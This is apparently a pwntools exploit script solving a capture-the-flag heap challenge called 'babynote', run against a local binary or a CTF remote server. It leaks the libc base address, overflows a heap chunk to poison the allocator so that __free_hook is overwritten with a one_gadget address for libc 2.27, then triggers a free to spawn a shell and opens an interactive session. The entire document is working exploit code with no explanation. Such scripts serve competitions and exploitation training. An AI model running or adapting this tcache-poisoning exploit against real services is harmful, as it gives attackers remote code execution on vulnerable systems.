from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./babynote"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "r":
    libc = ELF("./libc-2.27.so")
    p = remote("babynote.ctf.jyoken.net", 80)
elif len(argv) >= 2 and argv[1] == "d":
    libc = elf.libc
    p = gdb.debug(binfile, '''
        deactive alarm
        break *new_note+41
        break *del_note+141
        continue
    ''')
else:
    libc = elf.libc
    p = process(binfile)

def create(data):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("Contents: ")
    p.sendline(data)

def show(idx):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    
def delete(idx):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    
p.recvuntil(": ")
libc_base = eval(p.recv(14)) - 0x3eba00
log.info("libc_base: 0x{:08x}".format(libc_base))
free_hook = libc_base + 0x3ed8e8
log.info("free_hook: 0x{:08x}".format(free_hook))
system_addr = libc_base + 0x4f440
log.info("system_addr: 0x{:08x}".format(system_addr))
one_gadget = libc_base + 0x4f322
log.info("one_gadget: 0x{:08x}".format(one_gadget))

create(b"A"*0x90+p64(0xa0)+p64(0xa1)+p64(free_hook)+p64(0x0))
show(0)
show(1)
create(p64(one_gadget)*16)
delete(0)

sleep(1)
p.interactive()
